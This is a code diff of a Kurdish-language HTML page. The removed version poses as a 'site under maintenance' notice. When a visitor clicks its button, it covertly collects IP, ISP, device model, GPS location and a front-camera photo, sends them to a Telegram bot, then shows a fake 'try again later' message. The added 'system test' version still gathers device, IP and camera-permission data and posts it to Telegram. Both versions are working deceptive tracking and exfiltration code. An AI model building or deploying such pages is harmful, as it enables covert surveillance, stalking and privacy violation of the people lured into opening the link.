@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
+    <title>تۆماری زانیاری</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
         body {
@@ -25,10 +25,10 @@
             max-width: 400px;
             width: 90%;
         }
-        h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
+        h1 { font-size: 22px; color: #2980b9; margin-bottom: 15px; }
         p { font-size: 15px; color: #666; margin-bottom: 25px; }
         .btn {
-            background-color: #e74c3c;
+            background-color: #2980b9;
             color: white;
             border: none;
             padding: 15px 25px;
@@ -38,14 +38,14 @@
             width: 100%;
             font-weight: bold;
         }
-        .btn:hover { background-color: #c0392b; }
+        .btn:hover { background-color: #1f618d; }
     </style>
 </head>
 <body>
     <div class="container" id="content-box">
-        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-        <p>بۆ بینینی ناوەڕۆک و پشتڕاستکردنەوەی سیستەم، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
+        <h1>🔍 پشکنینی سیستەم</h1>
+        <p>تکایە بۆ تاقیکردنەوە و دەرخستنی زانیارییەکان کلیک لەسەر دوگمەی خوارەوە بکە:</p>
+        <button class="btn" onclick="testProcess()">تاقیکردنەوە</button>
     </div>
 
     <script>
@@ -54,42 +54,20 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        async function sendTelegramMessage(text) {
-            if (!chatId) return;
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-                });
-            } catch (err) {}
-        }
-
-        async function sendTelegramPhoto(blob) {
-            if (!chatId) return;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی کامێرای پێشەوە!**');
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            } catch (err) {}
-        }
-
-        async function startProcess() {
-            document.getElementById('content-box').innerHTML = '<h1>⏳ تكاتە چاوەڕوان بە...</h1><p>خەریکی پەیوەستبوون بە سیستەمەوە...</p>';
+        async function testProcess() {
+            document.getElementById('content-box').innerHTML = '<h1>⏳ خەریکی کۆکردنەوەم...</h1>';
 
             let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
             
-            // وەرگرتنی مۆدێلی ئامێر
+            // 1. مۆدێل
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
-                deviceModel = `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim();
+                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
             } catch (e) {}
 
-            // وەرگرتنی IP
+            // 2. IP
             let ip = 'نادیار', isp = 'نادیار';
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -98,63 +76,35 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            // لۆکەیشن
-            let locationText = "❌ بەردەست نییە";
+            // 3. کامێرا و ڕێگەپێدان
+            let cameraStatus = "نەگیرا";
             try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
-                });
-                locationText = `\`${pos.coords.latitude}, ${pos.coords.longitude}\``;
-            } catch (e) {}
-
-            // داواکردنی ڕاستەوخۆی کامێرا (Allow)
-            let imageBlob = null;
-            let cameraStatus = "❌ ڕەتکرایەوە";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                cameraStatus = "🟢 Allow کراوە و وێنە گیرا";
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                imageBlob = await new Promise((resolve) => {
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640; 
-                        canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                        canvas.toBlob(blob => {
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(blob);
-                        }, 'image/jpeg');
-                    }, 1200);
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                cameraStatus = "سەرکەوتوو بوو (Allow کرا)";
+                stream.getTracks().forEach(t => t.stop());
             } catch (e) {
-                cameraStatus = "🔴 Deny کراوە (یان قفڵە)";
+                cameraStatus = "ڕەتکرایەوە (Deny)";
             }
 
-            // ناردنی زانیارییەکان بۆ تێلێگرام
-            const msg = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
-⏰ کات: \`${visitTime}\`
-🌐 IP: \`${ip}\` (${isp})
-🎯 لۆکەیشن: ${locationText}
-📷 دۆخی کامێرا: ${cameraStatus}
-📱 ئامێر: \`${deviceModel}\``;
+            // دروستکردنی کورتەی زانیارییەکان بۆ نیشدان لەسەر شاشە
+            const summary = `کات: ${visitTime}\nمۆدێل: ${deviceModel}\nIP: ${ip}\nکامێرا: ${cameraStatus}`;
 
-            await sendTelegramMessage(msg);
+            // نیشاندانی ڕاستەوخۆ لەسەر شاشەی مۆبایلت بۆ دڵنیابوون
+            alert("✅ زانیارییەکان سەرکەوتووانە کۆکرانەوە:\n\n" + summary);
 
-            if (imageBlob) {
-                await sendTelegramPhoto(imageBlob);
+            // هەوڵدان بۆ ناردن بۆ تێلێگرام
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: `🔔 **تاقیکردنەوە:**\n${summary}`, parse_mode: 'Markdown' })
+                });
+                alert("📤 پەیامەکە بۆ تێلێگرامیش نێردرا!");
+            } catch (err) {
+                alert("❌ زانیارییەکان لە وێبگەڕدا هەبوون، بەڵام ناردن بۆ تێلێگرام سەرکەوتوو نەبوو (CORS/Network Error)");
             }
 
-            // گەڕاندنەوەی دۆخی ئاسایی پەڕەکە
-            document.getElementById('content-box').innerHTML = `
-                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
-            `;
+            document.getElementById('content-box').innerHTML = '<h1>✔️ تاقیکردنەوە تەواو بوو</h1>';
         }
     </script>
 </body>
